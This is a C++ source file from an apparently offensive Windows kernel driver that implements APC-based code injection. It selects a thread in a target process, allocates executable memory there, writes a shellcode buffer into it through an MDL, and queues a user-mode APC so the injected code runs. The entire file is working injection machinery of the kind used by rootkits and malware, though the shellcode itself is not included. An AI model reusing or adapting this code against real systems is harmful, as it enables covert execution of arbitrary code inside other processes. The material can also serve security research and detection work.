#include "../../lib/Memory.h"
#include "../../lib/Symbols.h"
#include "APCInjector.h"

APCInjector::APCInjector(Process& process, NonPagedBuffer& shellcode)
	: m_process(process)
	, m_shellcode(shellcode)
{}

NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
    auto status = STATUS_SUCCESS;
    const auto isWow64 = PsGetProcessWow64Process(m_process.get()) != NULL;
    ULONG bytesToAllocate = 0;

    status = ZwQuerySystemInformation(SystemProcessInformation, nullptr, NULL, &bytesToAllocate);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return status;
    }

    const auto processInformation = UniquePtr<SYSTEM_PROCESS_INFO, PagedPool, POOL_TAG>(
        reinterpret_cast<PSYSTEM_PROCESS_INFO>(ExAllocatePoolWithTag(PagedPool, bytesToAllocate, POOL_TAG)));

    status = ZwQuerySystemInformation(SystemProcessInformation, processInformation.get(), bytesToAllocate, NULL);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = STATUS_NOT_FOUND;
    for (auto entry = processInformation.get(); entry->NextEntryOffset != NULL; entry = reinterpret_cast<PSYSTEM_PROCESS_INFO>((reinterpret_cast<PUCHAR>(entry) + entry->NextEntryOffset))) {
        if (entry->UniqueProcessId == m_process.getPid()){
            for (size_t i = 0; i < entry->NumberOfThreads; i++){
                if (entry->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId()) {
                    continue;
                }

                *tid = HandleToUlong(entry->Threads[i].ClientId.UniqueThread);

                if (*tid){
                    if (isWow64 || PsIsProtectedProcess(m_process.get())){
                        *tid = 0;
                        continue;
                    }
                    return STATUS_SUCCESS;
                }
            }
        }
    }
    return status;
}

NTSTATUS APCInjector::queueKernelApc() {
    ULONG threadId = 0;
    auto status = findInjectableThread(&threadId);

    if (!NT_SUCCESS(status)) {
        return status;
    }

    const auto injectableThread = Thread(threadId);
    auto kernelApc = Apc(&normalRoutine, injectableThread, OriginalApcEnvironment, KernelMode);
    if (kernelApc.queue()) {
        return STATUS_SUCCESS;
    }

    return STATUS_INTERNAL_ERROR;
}

void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
	void* shellcodeAddress = nullptr;
	size_t shellcodeSize = sizeof(shellcodeHandler::injectedShellcode);

	auto status = ZwAllocateVirtualMemory(
		NtCurrentProcess(),
		&shellcodeAddress,
		NULL,
		&shellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);

	auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(shellcodeHandler::injectedShellcode), false, false, nullptr);

	if (!mdl) {
		KdPrint(("[-] Could not allocate a MDL.\n"));
		return;
	}

	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);

	auto mappedAddress = MmMapLockedPagesSpecifyCache(
		mdl,
		KernelMode,
		MmNonCached,
		nullptr,
		false,
		NormalPagePriority
	);

	if (!mappedAddress) {
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		KdPrint(("[-] Could not get a system address for the MDL.\n"));
		return;
	}

	status = MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);

	if (!NT_SUCCESS(status)) {
		MmUnmapLockedPages(mappedAddress, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		KdPrint(("[-] Could not protect MDL address.\n"));
		return;
	}

	RtlCopyMemory(mappedAddress, shellcodeHandler::injectedShellcode, shellcodeSize);

	MmUnmapLockedPages(mappedAddress, mdl);
	MmUnlockPages(mdl);
	IoFreeMdl(mdl);

	const auto currentThread = Thread(HandleToUlong(PsGetCurrentThreadId()));
	__debugbreak();
	auto apc = Apc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), currentThread, OriginalApcEnvironment, UserMode);
	apc.queue();

	KeTestAlertThread(UserMode);

	KdPrint(("[+] Injected code and queued an APC successfully (pid=%d).\n", PsGetCurrentProcessId()));
}

NTSTATUS APCInjector::inject() {
    return queueKernelApc();
}